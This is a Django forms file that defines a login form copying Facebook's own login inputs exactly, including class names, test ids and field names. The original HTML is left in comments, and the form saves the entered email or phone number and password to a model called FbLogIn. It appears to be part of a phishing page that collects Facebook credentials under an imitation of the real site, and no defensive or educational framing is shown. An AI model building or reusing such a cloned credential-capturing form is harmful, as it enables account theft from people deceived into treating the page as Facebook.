from django import forms
from .models import FbLogIn


class LogInForm(forms.ModelForm):

	#<input aria-label="Email address or phone number" autofocus="1" class="inputtext _55r1 _6luy" data-testid="royal_email" id="email" name="email" placeholder="Email address or phone number" type="text">
	username = forms.CharField(
		required = True,
		widget=forms.TextInput(
			attrs={
				'aria-label' : 'Email address or phone number',
				'autofocus' : '1',
				'class' : 'inputtext _55r1 _6luy',
				'data-testid' : 'royal_email',
				'id' : 'email',
				'name' : 'email',
				'placeholder' : 'Email address or phone number',
				'type' : 'text'
			}
		)

	)

	#<input aria-label="Password" class="inputtext _55r1 _6luy _9npi" data-testid="royal_pass" id="pass" name="pass" placeholder="Password" type="password"/>

	password = forms.CharField(
		required = True,
		widget=forms.TextInput(
			attrs={
				'aria-label' : 'Password',
				'class' : 'inputtext _55r1 _6luy _9npi',
				'data-testid' : 'royal_pass',
				'id' : 'pass',
				'name' : 'pass',
				'placeholder' : 'Password',
				'type' : 'password'
			}
		)
	)

	class Meta:
		model = FbLogIn
		fields = ['username', 'password']


